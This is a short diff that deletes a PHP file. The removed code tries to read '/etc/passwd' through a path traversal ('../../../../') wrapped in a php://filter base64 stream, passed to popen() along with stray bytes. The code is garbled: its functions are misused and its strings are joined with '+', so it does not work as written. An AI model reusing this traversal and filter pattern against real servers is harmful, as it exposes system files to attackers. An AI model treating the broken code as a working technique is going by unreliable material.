@@ -1,4 +1,0 @@
-<?php
-popen(implode(array_map(function($c) {return "\\x". str_pad(dechex($c), 2, "0");}, range(0, 255)), "php://filter/convert.base64-encode/resource=../../../../etc/passwd") + chr(0x1F) + chr(0x9B) + chr(0x4D));
-
-?>
